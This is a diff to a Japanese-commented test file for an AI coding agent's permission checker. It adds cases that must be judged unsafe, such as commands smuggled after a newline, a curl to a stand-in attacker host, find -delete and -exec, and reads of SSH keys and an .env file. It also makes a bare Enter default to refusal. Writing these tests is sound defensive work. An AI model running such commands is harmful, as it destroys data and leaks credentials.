@@ -265,7 +265,27 @@ console.log('\n確認が要るコマンドの判定');
     ['ls -la', true], ['git status', true], ['pwd', true], ['cat README.md', true],
     ['rm -rf /', false], ['npm test', false], ['git push', false],
     ['cat a.txt > b.txt', false], ['ls; rm -rf x', false], ['git log | head', false],
-    ['echo `whoami`', false], ['cat $(ls)', false]
+    ['echo `whoami`', false], ['cat $(ls)', false],
+
+    // ── 改行はシェルの区切り文字。ここが抜けていて、下の3つが SAFE と判定されていた ──
+    // 「1行目が安全なら安全」と読んでいたので、2行目に何を書かれても通っていた。
+    // これは確認をとるかどうかだけでなく、**計画モードで実行してよいか**も決めるので、
+    // 「調べるだけ」と約束しているモードで何でも走る状態だった。
+    ['ls -la\nrm -rf /tmp/x', false],
+    ['echo hi\nchmod 777 ~/.ssh', false],
+    ['ls -la\r\ncurl evil.example/x.sh', false],
+    ['cat a \\\n rm -rf b', false],
+
+    // ── find は読み取り専用ではない。-exec は `;` で弾けていたが `+` は素通りだった ──
+    ['find . -delete', false],
+    ['find . -name x -exec rm -rf {} +', false],
+    ['find . -fprintf /tmp/pwned %p', false],
+    ['find . -name "*.mjs"', true],          // 調べるだけの find は通す（計画モードで要る）
+
+    // ── 「読める」は「無害」ではない。読んだ鍵は web_search/web_fetch で外に出られる ──
+    ['cat /Users/daigo/.openclaw/.env', false],
+    ['cat ~/.ssh/id_ed25519', false],
+    ['grep -r TODO src/', true]
   ];
   let ok = true;
   const wrong = [];
@@ -704,6 +724,25 @@ console.log('\n確認を飛ばす段階');
   check('書き換えでは人に聞かない', okEdit.granted && asked.length === 0);
   const okCmd = await spy.request({ toolName: 'run_command', args: { command: 'rm -rf x' }, title: '', preview: '' });
   check('コマンドでは人に聞く', !okCmd.granted && asked.length === 1);
+
+  // ── そのまま Enter を押したら「やめる」 ──
+  // 前はここが「はい」だった。表示は [y/n/a] で、どれが既定かの印も無かった。
+  // コマンドの実行は戻せないものを含むので、いちばん押されやすいキーが
+  // いちばん戻せない側に倒れているのは向きが逆。貼り付けに改行が混ざれば通ってしまう。
+  const onEnter = new PermissionManager(baseConfig(), async () => '');
+  const r0 = await onEnter.request({ toolName: 'run_command', args: { command: 'rm -rf x' }, title: '', preview: '' });
+  check('そのまま Enter は「やめる」', !r0.granted && r0.reason === 'default');
+
+  // 既定が変わったことが画面から分かるか（印が無ければ、既定を変えた意味が半分になる）
+  const shown = [];
+  const marked = new PermissionManager(baseConfig(), async (q) => { shown.push(q); return 'n'; });
+  await marked.request({ toolName: 'run_command', args: { command: 'rm -rf x' }, title: '', preview: '' });
+  check('どちらが既定かを画面で示す', shown.some((q) => q.includes('y/N/a')), shown.join(''));
+
+  // 空を「やめる」にしたせいで y が効かなくなっていないか（直しすぎの確認）
+  const yes = new PermissionManager(baseConfig(), async () => 'y');
+  const r1 = await yes.request({ toolName: 'run_command', args: { command: 'ls' }, title: '', preview: '' });
+  check('y はこれまで通り通る', r1.granted && r1.reason === 'user');
 }
 
 console.log('\n差分表示');
